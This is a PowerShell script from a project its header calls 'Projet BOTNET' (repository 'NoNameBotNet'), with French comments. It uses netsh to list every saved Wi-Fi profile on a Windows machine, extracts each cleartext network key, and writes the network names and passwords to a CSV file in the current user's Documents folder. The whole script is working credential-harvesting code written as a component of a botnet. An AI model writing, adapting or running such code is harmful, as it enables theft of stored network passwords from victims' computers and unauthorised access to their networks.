#######################
# Projet BOTNET
# Date de creation: 10/01/2018
# Version: 0.1
# Auteur: Paul RICHIARDI
#
# Permet de stocker dans un CSV l'ensemble des réseaux WIFI et leurs clés où l'utilisateur s'est déjà connecté
#
#######################


### Commande principale 

# netsh wlan show profiles 
# netsh wlan show profile name=<profile> key=clear

$User = "$Env:Username" #Récupère l'utilisateur courant de la session

$wifi=@() #creation de tableau

# Visualisation des SSID de réseaux bloqués
$cmd0=netsh wlan show blockednetworks

# Liste l'ensemble des SSID
$cmd1=netsh wlan show profiles

ForEach($row1 in $cmd1)
{
    #Récupération des SSID par expression régulière
    If($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
    {
        $ssid=$Matches[1]
        $cmd2=netsh wlan show profiles $ssid key=clear
        ForEach($row2 in $cmd2)
        {
            #Récupération des clés par expression régulière
            If($row2 -match 'Contenu de la c[^:]+:.(.+)$')
            {
                $key=$Matches[1]
                #Stockage des SSID et clés dans un tableau
                $wifi+=[PSCustomObject]@{ssid=$ssid;key=$key}
            }
        }
    }
}

#Export du tableau dans un fichier csv
$pathfile = 'C:\Users\'+$User+'\Documents\wifi.csv'
$wifi|Export-CSV -Path $pathfile -NoTypeInformation


# $wifi|Export-CSV -Path 'C:\Users\Paul\Documents\GitHub\NoNameBotNet\Recup Data\wifi.csv' -NoTypeInformation
